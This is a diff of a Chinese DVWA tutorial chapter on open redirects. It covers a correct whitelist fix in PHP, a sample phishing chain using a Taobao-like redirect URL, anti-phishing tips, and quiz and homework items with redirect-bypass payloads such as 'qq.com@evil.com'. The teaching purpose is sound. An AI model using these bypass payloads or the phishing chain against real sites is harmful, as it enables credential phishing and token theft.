-✅ **二次注入进阶、页面跳转注入** —— 更多的注入场景
-✅ **SQLi-Labs通关总结** —— 回顾了所有注入类型和技巧
-✅ **手工注入vs工具注入** —— 原理要懂，工具要用
-✅ **下章预告** —— sqlmap + 文件上传，精彩继续！
-
-### 给你的话 💌
-
-能走到这里，你已经超过了90%的新手！真的很棒！
-
-学习的道路上，最难得的就是坚持。很多人学着学着就放弃了，但你坚持下来了，这就是最大的胜利！
-
-当然，学无止境。SQL注入的内容还有很多很多，我们只是入门而已。
-
-但没关系，路要一步一步走，饭要一口一口吃。只要你保持这份热情和坚持，总有一天你会成为大神的！
-
-我们下一章，再见！👋
+**High 级别伪防护总结：** 加了个 id=yes 的"存在性检测"，就像**你在防盗门上焊死 10 把锁，但是旁边那堵墙用的是纸糊的**😂。
 
 ---
 
-> 💡 **小提示**：学累了就休息一下，喝杯水，活动活动身体。学习是个长期的过程，不用急于一时！
+## 17.5 Impossible 级别：终于写对了！严格白名单 + 相对路径 ✅
+
+```php
+<?php
+// 白名单！只允许跳这三个页面！其他一律跳首页
+$allowedRedirects = array(
+    "index.php",
+    "instructions.php",
+    "setup.php",
+);
+if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != NULL) {
+    $target = $_GET['redirect'];
+    // ✅ 正确1：in_array() 严格匹配白名单，一点都不能多、不能少
+    if (in_array($target, $allowedRedirects, true)) {
+        header("Location: " . $target);
+        exit;
+    } else {
+        // ✅ 正确2：不匹配？给一个统一错误页，不泄露任何东西
+        header("Location: /index.php?redirectError=invalid");
+    }
+}
+?>
+```
+
+**Impossible 级别的三层正确写法（必背！⭐⭐⭐）：**
+1. **✅ 白名单 `in_array` 严格匹配（第 3 参数 true=类型严格）**：不是"包含"、不是"前缀"、不是"后缀"，是**完完全全一字不差**等于白名单里的条目
+2. **✅ 只允许"站内相对路径"，不接受 http/https 外站链接**：Location 跳 `index.php` = 站内；跳 `https://evil.com` = 外站（直接被白名单拒绝）
+3. **✅ 非法 URL 统一跳错误页**：不返回任何"你错在哪个字符"的信息，防止攻击者用"反馈差异"绕过白名单
+
+> 🔥 **安全开发铁律：** 做 Redirect、做文件上传后缀、做下载白名单……**一切涉及"允许去哪里/允许传什么"的场景，通通白名单+严格匹配，别想黑名单和 strpos！**
+
+---
+
+## 17.6 真实世界钓鱼案例 + 普通用户如何防骗？💸
+
+### 17.6.1 一个真实的重定向钓鱼攻击链（跟 DVWA 一模一样）
+
+```
+🎭 攻击链条 8 步走：
+① 黑客注册了一个看起来跟淘宝像的域名：taobao-login-verify.com
+② 黑客发现淘宝有 Open Redirect 漏洞：
+   https://login.taobao.com/redirect.go?url=任意网址
+③ 黑客把链接拼接好：
+   https://login.taobao.com/redirect.go?url=https://taobao-login-verify.com
+④ 黑客群发短信/邮件：
+   【淘宝】您的账号因异常登录被锁定，请立即打开
+   https://login.taobao.com/redirect.go?url=https://taobao...
+⑤ 受害者一看：URL 域名是 login.taobao.com！真淘宝！点！
+⑥ 淘宝服务器 302 跳 taobao-login-verify.com（受害者没察觉）
+⑦ 假淘宝页面跟真淘宝一模一样，受害者输入账号/密码/短信码
+⑧ 黑客拿到信息 → 登录真淘宝 → 清空余额/下单买礼品卡 😭
+```
+
+### 17.6.2 给零基础同学的 4 条防骗 Checklist（比反诈 APP 还好用！）
+
+```
+✅ 防骗 Check 1：提交敏感信息（密码/验证码/身份证）前，
+   一定看"第二次加载出来"的页面的地址栏是不是官方域名！
+   ↳ 重定向漏洞的特点就是"点完按钮/链接的第二跳才是假网站"，第一跳是真的！
+
+✅ 防骗 Check 2：永远不要相信短信/微信发来的"紧急激活/紧急解封"链接。
+   ↳ 正确做法：自己从手机桌面打开官方 APP，在 APP 里看消息！
+
+✅ 防骗 Check 3：看到 URL 里包含 `?redirect=` / `?next=` / `?url=` / `?go=` / `?callback=`
+   ↳ 多留一个心眼！把等号后面的那一串解码一下，是不是跳外站了？
+
+✅ 防骗 Check 4：银行/支付类页面，点"登录"按钮之前，
+   一定把 F12 → Network 打开看一下表单 action 是不是官方域名！
+   ↳ 防止"假页面做得跟真的一毛一样"这种情况。
+```
+
+---
+
+## 17.7 课后自测 + 作业 📝（零基础必做！）
+
+### 📝 题 1：选择题（每题 10 分，共 30 分）
+
+**1. 某 PHP 代码里有一行 `header("Location: ".$_GET['next'])`，它属于什么漏洞？**
+- A. SQL 注入
+- B. 开放式重定向（Open Redirect）
+- C. XSS 跨站脚本
+- D. CSRF 跨站请求伪造
+
+**2. 某开发者想防止 Open Redirect，写了 `if(strpos($url,'.qq.com')!==false)` 放行，下列哪个 Payload 能成功绕过去跳外站？**
+- A. `https://evil.com/?next=qq.com`
+- B. `https://qq.com@evil.com/`
+- C. `https://evil.com/#https://www.qq.com/`
+- D. **以上三个都可以** ✨
+
+**3. 修复 Open Redirect 最正确的姿势是？**
+- A. `if (strpos($url, 'http') !== false)` 判断是否 http 开头
+- B. 用 `in_array($url, ['/index.php','/login.php'], true)` 严格匹配白名单相对路径
+- C. 把所有 `//evil.com` 替换成空字符串
+- D. 禁止所有 302 跳转，全部改成 Meta Refresh 标签
+
+### 🔧 题 2：实操题（每题 25 分，共 50 分）
+
+**实操 1：Low / Medium / High 三级分别出一个 302 跳外站的 payload**
+打开你的 DVWA，security 分别切 low/medium/high，进 Open HTTP Redirect，然后构造 payload，**用浏览器 F12 → Network 面板截一张 302 Location 指向外站的截图**，三级各一张。
+
+**实操 2：写出 3 种"要求 URL 包含 taobao.com 但实际要跳 127.0.0.1"的绕过 URL**
+（提示：今天 17.3 节的速查表，挑 3 个你觉得最帅的姿势！）
+
+### 💡 题 3：思考题（20 分）
+
+> 你是公司的安全工程师，产品经理说"业务方要求我们的登录页支持跳转到任意合作方的域名，合作方名单随时加**上百个**"，不能写死数组白名单。
+>
+> 请写出你会怎么设计"既满足业务又不产生 Open Redirect 漏洞"的方案？
+>
+> （**小提示：** Day12 CAPTCHA 我们学过一个"两步流程：第一步校验 CAPTCHA→ 返回 step2 表单，第二步才真正改密码"的思路，能不能把"跳外部域名"做成一个**用户可感知的"中转提示页"**？写清楚提示语 `您即将离开本网站，前往 xxx.com，是否继续？[取消] [继续前往]`，这就是大厂们都在用的"外链跳转提示页"！）
+
+---
+
+## 17.8 本章小结 + 下章预告 🚀
+
+**🎉 Day17 开放式重定向 通关总结：**
+- ✅ 搞懂了 HTTP 302 + Location 的基本工作原理 = 浏览器"看到小票就乖乖跑下一家"
+- ✅ 搞懂了开放式重定向的 4 大危害：**钓鱼 / OAuth 偷 token / XSS 放大器 / 品牌污损**
+- ✅ Low 级别完全无校验的裸跳漏洞，5 种不同 payload 打穿
+- ✅ Medium 级别的 3 种绕过：**直接 http 开头本身合法 / @ 丢 Basic Auth / ? 或 # 把白名单丢不解析位**
+- ✅ 拿到了 **6 条万能绕过速查表**（@ / 子域名 / ? / # / 协议相对 // / 路径穿越 ../）
+- ✅ High 级别"加 id=yes 校验但 redirect 依然裸奔"的前门加锁后门全开案例
+- ✅ Impossible 级别正确修复三件套：**in_array 严格白名单 + 只允许相对路径 + 非法统一错误页**
+- ✅ 学会了 4 条防骗 Checklist，保护自己和家人不上"官方域名钓鱼短信"的当！
+
+重定向漏洞今天拿下来之后，我们 DVWA 的**"逻辑漏洞四大金刚"**（CAPTCHA 已学、Weak Session 已学、Redirect 已学）就只剩最后一个了——**Header Injection HTTP 头注入 + 一些 DVWA 彩蛋漏洞（XSS Reflected 没讲的进阶玩法、CSRF 新姿势等）**。
+
+**下一章 Day18：HTTP Header Injection HTTP 头注入**，我们会看到"开发者把用户可控的内容拼到 Set-Cookie、Location、Host 这些 HTTP 响应头里，导致被注入 CRLF `%0d%0a` 换行符之后，**一行注入变两行、Set-Cookie 被篡改、Location 被拼外站、甚至直接加 script 标签打 XSS**"的操作，以及最后一份 **DVWA 各模块速通 CheatSheet**（给你考前一晚上过一遍就能上场的神器），绝对干货满满！💪
+
+**同学们把 6 条万能绕过口诀背下来！Day18 我们不见不散！👋**
